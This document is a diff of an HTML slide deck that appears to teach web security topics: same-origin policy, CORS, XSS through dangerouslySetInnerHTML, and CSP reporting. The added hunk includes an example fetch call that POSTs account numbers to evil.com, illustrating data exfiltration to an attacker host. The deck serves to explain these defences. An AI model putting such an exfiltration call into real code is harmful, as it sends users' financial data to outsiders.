@@ -96,7 +96,7 @@
             </h1>
           </section>
           <section>
-            <h2>Access iframe to steal content</h2>
+            <h2>Access iframe to <span class="error">steal</span> content</h2>
             <img class="fragment" src="media/bank.png" />
             <h2 class="fragment">
               <span class="sameorigin">Same-origin</span> policy blocks it
@@ -115,7 +115,7 @@ fetch('http://bank.com/api/send',
           <section>
             <h1>Breaking <span class="sameorigin">Same-origin</span></h1>
             <h2 class="fragment">Third party API</h2>
-            <h2 class="fragment">Different domain for backend</h2>
+            <h2 class="fragment">Different <span class="cors">origin</span> for backend</h2>
             <h2 class="fragment">
               <span class="cors">C</span>ross-<span class="cors">O</span>rigin
               <span class="cors">R</span>esource
@@ -298,7 +298,7 @@ fetch('http://bank.com/api/send',
 							fetch('https://rickandmortyapi.com/api/character/311?jwt=eyJhbGciOiJIUzI1', 
 							{method: 'DELETE'})
 						</code></pre>
-            <h2 class="fragment">Cross Site Scripting (XSS)</h2>
+            <h2 class="fragment error">Cross Site Scripting (XSS)</h2>
             <pre><code class="html fragment" data-trim data-line-numbers>
 							&lt;div dangerouslySetInnerHTML={getMyInnerHtml()} /&gt;
 						</code></pre>
@@ -395,6 +395,7 @@ fetch('http://bank.com/api/send',
           </section>
           <section>
             <h1 class="">Report-to</h1>
+            <h2 class="fragment">POST request</h2>
             <h2 class="fragment">Could en up blocking valid assets</h2>
             <h2 class="fragment">
               <span class="cors">Google analytics</span> is technically
@@ -409,6 +410,9 @@ fetch('http://bank.com/api/send',
           <h2 class="fragment">Forward request</h2>
           <pre><code class="typescript fragment" data-trim data-line-numbers>
             fetch('http://bank.com/api/send', {method: 'POST', body: accountNumbers()})
+          </code></pre>
+          <pre><code class="typescript fragment" data-trim data-line-numbers>
+            fetch('http://evil.com/api/send', {method: 'POST', body: accountNumbers()})
           </code></pre>
           <h2 class="fragment">No cookies</h2>
           <h2 class="fragment">
